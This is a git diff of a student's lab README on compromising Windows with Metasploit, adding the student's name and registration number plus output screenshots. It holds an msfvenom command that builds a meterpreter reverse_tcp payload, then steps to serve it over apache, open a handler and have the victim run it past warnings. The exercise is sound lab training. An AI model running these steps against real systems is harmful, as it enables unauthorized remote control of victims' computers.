@@ -1,5 +1,6 @@
 # Compromising-windows-using-Metasploit
-Compromising windows using Metasploit
+# NAME-SRILAKSHMI BH
+# REG.NO-212224100057
 # Metasploit
 Compromising windows using Metasploit
 
@@ -26,35 +27,48 @@ Open terminal and try execute some kali linux commands
 Find the attackers ip address using ifconfig
 ## OUTPUT:
 
+<img width="601" height="294" alt="image" src="https://github.com/user-attachments/assets/1fd840f1-8bc9-475f-8d6d-66ee26bed554" />
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
 
+<img width="916" height="177" alt="image" src="https://github.com/user-attachments/assets/d78e217d-156b-4057-8cb5-f05fb6ceedd1" />
+
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
+
+
 
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
 
+<img width="319" height="46" alt="image" src="https://github.com/user-attachments/assets/e0a82961-0370-4ac0-83f1-f0767d6ed213" />
+
 
 Check the status of apache2
 ## OUTPUT:
+
+<img width="1120" height="616" alt="image" src="https://github.com/user-attachments/assets/57c5ebda-7dee-462f-aa2e-8ef0e1c81ed7" />
 
 
 
 Invoke msfconsole:
 ## OUTPUT:
 
+<img width="844" height="346" alt="image" src="https://github.com/user-attachments/assets/67b45606-64cc-42aa-b304-dccd26ce768f" />
 
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 ## OUTPUT:
+
+<img width="328" height="62" alt="image" src="https://github.com/user-attachments/assets/85add79c-3c92-4a5a-b540-c93ad5a3a164" />
+
 
 
 
@@ -65,6 +79,7 @@ set LHOST 0.0.0.0
 
 ## OUTPUT:
 
+<img width="1023" height="240" alt="image-7" src="https://github.com/user-attachments/assets/0bc20b75-1f05-4b2d-b941-3b7f42ca8a0f" />
 
 
 
@@ -77,6 +92,8 @@ The file "fun.exe" downloads.
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 ## OUTPUT:
+
+<img width="1023" height="240" alt="image-13" src="https://github.com/user-attachments/assets/fe4a857d-5885-4a8e-83fd-1bc48f8a5920" />
 
 
 
